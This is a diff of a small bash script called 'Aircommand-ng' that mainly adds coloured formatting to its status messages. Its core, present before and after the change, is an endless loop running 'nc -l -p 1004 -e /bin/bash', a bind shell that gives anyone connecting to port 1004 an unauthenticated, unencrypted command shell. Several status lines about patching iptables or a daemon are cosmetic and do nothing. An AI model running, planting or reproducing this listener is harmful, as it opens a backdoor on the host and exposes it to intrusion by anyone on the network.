@@ -1,29 +1,27 @@
 #!/bin/bash
-echo "[+] Aircommand-ng v0.9.1 by elogada (c)2018, all deps not mine"
+echo -e "\033[1m"[+]"\033[0m" "Aircommand-ng v0.9.1 by elogada (c)2018, all deps not mine"
 sleep 3
-echo "[+] Initiating script for the first time..."
-echo "[!] Please wait while script is readied..."
+echo -e "\033[1m"[+]"\033[0m" "Initiating script for the first time..."
+echo -e "\033[1m""\033[1m"[+]"\033[0m" "Please wait while script is readied..."
 sleep 3
-echo "[ ok ] Script for init..."
-echo "[ ok ] Network for init..."
+echo -e "\033[32m""\033[1m"[ ok ]"\033[0m" "Script for ready for init..."
+echo -e "\033[32m""\033[1m"[ ok ]"\033[0m" "Network for init..."
 sleep 3
 while [ 1=1 ]
 do
-        echo "[+] Listener seems closed."
+        echo -e "\033[1m"[+]"\033[0m" "Listener seems closed."
         sleep 1
-        echo "[!] Establishing network connections... Please wait..."
-        echo "[ ok ] Networking stage finished."
-        echo "[!] Please check if it failed."
-        echo "[+] Patching IPTables to open appropriate ports..."
+        echo -e "\033[33m""\033[1m"[!]"\033[0m" "Establishing network connections... Please wait..."
+        echo -e "\033[1m"[+]"\033[0m" "Networking stage finished."
         sleep 1
-        echo "[ ok ] Port open stage finished."
-        echo "[!] NONE OF THIS IS FAILSAFE."
-        echo "[ ok ] Connection ready!"
+        echo -e "\033[1m"[+]"\033[0m" "Port open stage finished."
+        echo -e "\033[1m"[-]"\033[0m" "Encryption is unavailable. Please tread wisely."
+        echo -e "\033[32m""\033[1m"[ ok ]"\033[1m" "Connection ready!"
         nc -l -p 1004 -e /bin/bash
-        echo "[!] Connection closed!"
-        echo "[+] Attempting to restart metadaemon..."
+        echo -e "\033[31m""\033[1m"[!] "\033[0m""Connection closed!"
+        echo -e "\033[1m"[+]"\033[0m""Attempting to restart pseudo-daemon..."
         sleep 3
         echo ""
-        echo "[ ok ] Aircommand-ng ready for rebump!"
+        echo -e "\033[32m""\033[1m"[ ok ]"\033[0m" "Aircommand-ng ready for rebump!""\033[0m"
 done
 ~                              
